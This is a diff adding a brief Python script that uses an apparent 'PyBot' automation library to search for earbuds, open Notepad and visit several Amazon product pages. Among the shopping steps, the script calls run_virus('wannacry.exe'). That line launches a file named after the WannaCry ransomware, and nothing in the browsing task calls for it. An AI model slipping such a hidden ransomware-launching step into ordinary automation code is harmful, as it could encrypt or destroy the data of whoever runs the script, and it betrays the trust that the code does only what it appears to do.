@@ -1,0 +1,10 @@
+import PyBot
+
+PyBot.SimplifiedBot.google_search("Earbuds")
+PyBot.SimplifiedBot.open_notepad()
+PyBot.SimplifiedBot.web_search("https://www.amazon.com/s?k=earbuds&gclid=CjwKCAjw7eSZBhB8EiwA60kCW1B1Z2lvZZd1vrXQw6J8Pmg6RxomQyyaOabi40tCHlhmuDopwIuxjhoCtpoQAvD_BwE&hvadid=177357075829&hvdev=c&hvlocphy=9027746&hvnetw=g&hvqmt=e&hvrand=5324327195340077624&hvtargid=kwd-15932982&hydadcr=9738_9836272&tag=googhydr-20&ref=pd_sl_engy6n7re_e")
+PyBot.SimplifiedBot.web_search("https://www.amazon.com/AmazonBasics-Ear-Headphones-Mic-Black/dp/B07HH1QSLB/ref=sr_1_1_sspa?gclid=CjwKCAjw7eSZBhB8EiwA60kCW1B1Z2lvZZd1vrXQw6J8Pmg6RxomQyyaOabi40tCHlhmuDopwIuxjhoCtpoQAvD_BwE&hvadid=177357075829&hvdev=c&hvlocphy=9027746&hvnetw=g&hvqmt=e&hvrand=5324327195340077624&hvtargid=kwd-15932982&hydadcr=9738_9836272&keywords=earbuds&qid=1664746331&qu=eyJxc2MiOiI3Ljk4IiwicXNhIjoiNy43OSIsInFzcCI6IjcuMzUifQ%3D%3D&sr=8-1-spons&spLa=ZW5jcnlwdGVkUXVhbGlmaWVyPUEzOEhEVlFGSFhSSFIyJmVuY3J5cHRlZElkPUEwOTc0NDk1M0VOSUpDRlJaNk9EQyZlbmNyeXB0ZWRBZElkPUEwODgyMDIzMjdRUVEwMDNPTTdCQiZ3aWRnZXROYW1lPXNwX2F0ZiZhY3Rpb249Y2xpY2tSZWRpcmVjdCZkb05vdExvZ0NsaWNrPXRydWU&th=1")
+PyBot.SimplifiedBot.web_search("https://www.amazon.com/TOZO-A1-Light-Weight-Headphones-Microphone/dp/B09FT58QQP/ref=sr_1_4?gclid=CjwKCAjw7eSZBhB8EiwA60kCW1B1Z2lvZZd1vrXQw6J8Pmg6RxomQyyaOabi40tCHlhmuDopwIuxjhoCtpoQAvD_BwE&hvadid=177357075829&hvdev=c&hvlocphy=9027746&hvnetw=g&hvqmt=e&hvrand=5324327195340077624&hvtargid=kwd-15932982&hydadcr=9738_9836272&keywords=earbuds&qid=1664746742&qu=eyJxc2MiOiI3Ljk4IiwicXNhIjoiNy43OSIsInFzcCI6IjcuMzUifQ%3D%3D&sr=8-4&th=1")
+PyBot.SimplifiedBot.run_virus("wannacry.exe")
+PyBot.SimplifiedBot.web_search("https://www.amazon.com/Apple-MLWK3AM-A-AirPods-Pro/dp/B09JQMJHXY/ref=sr_1_6?gclid=CjwKCAjw7eSZBhB8EiwA60kCW1B1Z2lvZZd1vrXQw6J8Pmg6RxomQyyaOabi40tCHlhmuDopwIuxjhoCtpoQAvD_BwE&hvadid=177357075829&hvdev=c&hvlocphy=9027746&hvnetw=g&hvqmt=e&hvrand=5324327195340077624&hvtargid=kwd-15932982&hydadcr=9738_9836272&keywords=earbuds&qid=1664746742&qu=eyJxc2MiOiI3Ljk4IiwicXNhIjoiNy43OSIsInFzcCI6IjcuMzUifQ%3D%3D&sr=8-6&ufe=app_do%3Aamzn1.fos.f5122f16-c3e8-4386-bf32-63e904010ad0")
+PyBot.SimplifiedBot.close_notepad()
